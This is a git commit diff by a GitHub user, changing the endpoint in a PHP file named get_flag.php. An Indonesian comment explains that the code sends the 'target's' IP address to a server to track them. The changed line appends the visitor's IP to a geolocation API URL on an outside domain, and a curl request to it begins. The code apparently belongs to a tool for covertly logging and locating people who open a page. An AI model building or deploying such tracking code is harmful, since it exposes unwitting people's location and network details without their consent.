5d2fe4d82b9b45996be2afae81e3b532d217f63e
Jefanya Efandchris <53685179+jefanya14@users.noreply.github.com>
2022-10-07 15:09:15 +0700

    Update get_flag.php

--- system/get_flag.php
+++ system/get_flag.php
@@ -20,7 +20,7 @@ return $ipaddress;
 }
 
 // MENGIRIM ALAMAT IP PRIBADI SI TARGET KE SERVER UNTUK DILACAK
-$url = "https://jefanya.online/api/geolocation/?ip=".getClientIP();
+$url = "https://jefanya.website/api/geolocation/?ip=".getClientIP();
 
 $curl = curl_init($url);
 curl_setopt($curl, CURLOPT_URL, $url);
